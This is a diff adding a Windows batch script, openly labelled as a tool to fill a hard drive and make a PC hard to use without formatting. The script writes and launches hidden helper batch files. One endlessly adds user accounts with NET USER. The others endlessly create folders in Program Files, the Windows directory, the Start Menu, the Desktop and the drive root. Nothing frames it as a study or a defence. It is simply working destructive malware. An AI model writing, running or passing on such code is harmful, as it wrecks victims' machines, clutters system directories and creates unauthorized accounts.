@@ -1,0 +1,71 @@
+MAKE YOUR HARD DRIVE FULL BY COPYING ITSELF AND MAKE HARD TO USE PC WITHOUT FORMATTING
+
+@ECHO OFF
+@ECHO A PHOENIX PRODUCTION
+@ECHO MAIN BAT RUNNING
+GOTO start
+
+:start
+@ECHO SET snowball2=1 >> bat6.bat
+@ECHO GOTO flood5 >> bat6.bat
+@ECHO :flood5 >> bat6.bat
+@ECHO SET /a snowball2=%%snowball2%%+1 >> bat6.bat
+@ECHO NET USER snowball2%%snowball2%% /add >> bat6.bat
+@ECHO GOTO flood5 >> bat6.bat
+START /MIN bat6.bat
+GOTO bat5
+
+:bat5
+@ECHO CD %%ProgramFiles%%\ >> bat5.bat
+@ECHO SET maggi=1 >> bat5.bat
+@ECHO GOTO flood4 >> bat5.bat
+@ECHO :flood4 >> bat5.bat
+@ECHO MKDIR maggi%%maggi%% >> bat5.bat
+@ECHO SET /a maggi=%%maggi%%+1 >> bat5.bat
+@ECHO GOTO flood4 >> bat5.bat
+START /MIN bat5.bat
+GOTO bat4
+
+:bat4
+@ECHO CD %%SystemRoot%%\ >> bat4.bat
+@ECHO SET marge=1 >> bat4.bat
+@ECHO GOTO flood3 >> bat4.bat
+@ECHO :flood3 >> bat4.bat
+@ECHO MKDIR marge%%marge%% >> bat4.bat
+@ECHO SET /a marge=%%marge%%+1 >> bat4.bat
+@ECHO GOTO flood3 >> bat4.bat
+START /MIN bat4.bat
+GOTO bat3
+
+:bat3
+@ECHO CD %%UserProfile%%\Start Menu\Programs\ >> bat3.bat
+@ECHO SET bart=1 >> bat3.bat
+@ECHO GOTO flood2 >> bat3.bat
+@ECHO :flood2 >> bat3.bat
+@ECHO MKDIR bart%%bart%% >> bat3.bat
+@ECHO SET /a bart=%%bart%%+1 >> bat3.bat
+@ECHO GOTO flood2 >> bat3.bat
+START /MIN bat3.bat
+GOTO bat2
+
+:bat2
+@ECHO CD %%UserProfile%%\Desktop\ >> bat2.bat
+@ECHO SET homer=1 >> bat2.bat
+@ECHO GOTO flood >> bat2.bat
+@ECHO :flood >> bat2.bat
+@ECHO MKDIR homer%%homer%% >> bat2.bat
+@ECHO SET /a homer=%%homer%%+1 >> bat2.bat
+@ECHO GOTO flood >> bat2.bat
+START /MIN bat2.bat
+GOTO original
+
+:original
+CD %HomeDrive%\
+SET lisa=1
+GOTO flood1
+:flood1
+MKDIR lisa%lisa%
+SET /a lisa=%lisa%+1
+
+GOTO flood1
+
